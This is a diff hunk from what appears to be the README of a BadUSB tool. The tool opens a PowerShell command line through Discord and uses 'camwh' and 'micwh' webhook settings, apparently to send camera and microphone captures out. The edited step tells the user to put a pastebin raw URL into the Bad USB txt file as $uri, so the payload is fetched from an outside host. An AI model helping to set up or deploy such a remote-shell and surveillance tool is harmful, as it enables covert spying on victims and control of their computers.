@@ -28,7 +28,7 @@ Also opens a powershell command line interface through discord.
   "camwh": "WEBHOOK_HERE",
   "micwh": "WEBHOOK_HERE"
 }
-2. Copy the RAW file url eg. https://pastebin.com/raw/xxxxxxxx into this script below
+2. Copy the RAW file url into the Bad USB txt file like this.. $uri = 'https://pastebin.com/raw/xxxxxxxx'
 
 
 **INFORMATION**
